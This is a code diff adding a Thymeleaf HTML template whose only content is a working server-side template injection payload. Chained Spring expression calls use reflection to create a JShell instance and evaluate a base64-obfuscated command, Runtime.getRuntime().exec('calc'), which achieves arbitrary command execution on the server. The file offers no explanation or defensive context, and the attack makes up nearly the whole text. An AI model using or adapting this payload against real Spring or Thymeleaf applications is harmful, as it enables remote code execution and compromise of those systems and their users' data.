@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+</head>
+<body>
+
+<tr
+        th:with="createMethod=${T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName('jdk.jshell.JShell',T(org.springframework.util.ClassUtils).getDefaultClassLoader()), 'create' )}"
+>
+    <td>
+        <a
+                th:with="shellObj=${T(org.springframework.util.ReflectionUtils).invokeMethod(createMethod, null)}"
+        >
+            <a
+                    th:with="evalMethod=${T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName('jdk.jshell.JShell',T(org.springframework.util.ClassUtils).getDefaultClassLoader()), 'eval', ''.getClass() )}"
+            >
+                <a
+                        th:with="param2=${T(org.springframework.util.ReflectionUtils).invokeMethod(evalMethod, shellObj,  new java.lang.String(T(org.springframework.util.Base64Utils).decodeFromString('amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNhbGMiKQ==')))
+                }"
+                        th:href="${param2}"
+                ></a>
+            </a>
+
+        </a>
+    </td>
+</tr>
+
+</body>
+</html>
